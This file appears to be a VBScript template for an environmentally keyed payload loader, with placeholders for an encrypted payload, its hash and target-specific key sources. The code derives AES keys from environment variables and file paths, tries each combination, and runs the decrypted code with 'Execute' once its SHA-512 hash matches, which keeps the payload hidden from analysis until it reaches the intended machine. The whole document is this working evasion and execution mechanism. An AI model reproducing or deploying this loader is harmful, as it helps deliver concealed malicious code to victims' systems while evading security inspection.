~AUTOVERSION~
Function decryptAES(decryptMe, key, iv)
    dim aes, a, encBytes, encLen, decrypted, numPads
    set aes = CreateObject("System.Security.Cryptography.RijndaelManaged")
    set a = CreateObject("System.Text.ASCIIEncoding")
    aes.Mode = 1
    aes.Padding = 2
    aes.BlockSize = 128
    aes.KeySize = 256
    aes.IV = decodeBase64(iv)
    aes.Key = a.GetBytes_4(key)

    numPads = len(decryptMe) - len(replace(decryptMe, "=", ""))
    encLen = ((a.GetByteCount_2(decryptMe) / 4) * 3) - numPads

    decryptAES = a.GetString(aes.CreateDecryptor().TransformFinalBlock(decodeBase64(decryptMe),0,encLen))
End Function
Function decodeBase64(base64)
    dim dm, el
    set dm = CreateObject("Microsoft.XMLDOM")
    set el = dm.createElement("tmp")
    el.dataType = "bin.base64"
    el.text = base64
    decodeBase64 = el.nodeTypedValue
End Function
Function binToHex(binary)
    dim dom
    set dom = CreateObject("Microsoft.XMLDOM")
    dom.loadXML("<W00t/>")
    dom.documentElement.dataType = "bin.hex"
    dom.documentElement.nodeTypedValue = binary
    dom.documentElement.removeAttribute("dt:dt")
    binToHex = dom.documentElement.nodeTypedValue
End Function
function getSHA512(bytes)
    dim sha512, text
    set sha512 = CreateObject("System.Security.Cryptography.SHA512Managed")
    set text = CreateObject("System.Text.ASCIIEncoding")
    getSHA512 = binToHex(sha512.ComputeHash_2((text.GetBytes_4(bytes))))
End Function
function compareHash(decrypted, hash, minusBytes)
    dim sha512, text, newHash
    set sha512 = CreateObject("System.Security.Cryptography.SHA512Managed")
    set text = CreateObject("System.Text.ASCIIEncoding")
    newHash = getSHA512(Mid(decrypted, 1, (len(decrypted) - minusBytes)))
    If newHash = hash Then
        compareHash = True
    Else
        compareHash = False
    End If
End Function
Function tryKeyCombos(combos, path, encrypted, payloadHash)
    For k = 0 To combos.Count
        dim key, decrypted
        key = LCase(combos.Item(k) + path)
        sub_key = Mid(getSHA512(key), 1, 32)
        On Error Resume Next
        decrypted = decryptAES(encrypted, sub_key, "~AESIVBASE64~")
        If Err.Number = 0 Then
            If (compareHash(decrypted, payloadHash, ~MINUSBYTES~)) Then
                Execute decrypted
                WScript.Quit 1
            End If
        End If
    Next
End Function

Set allPaths = CreateObject("System.Collections.ArrayList")
Set envCombos = CreateObject("System.Collections.ArrayList")
allPaths.add ""
envCombos.add ""

~WALKOS~
~ENVVAR~
For index = 0 To allPaths.Count
    tryKeyCombos envCombos, allPaths.Item(index), "~ENCRYPTEDBASE64~", "~PAYLOADHASH~"
Next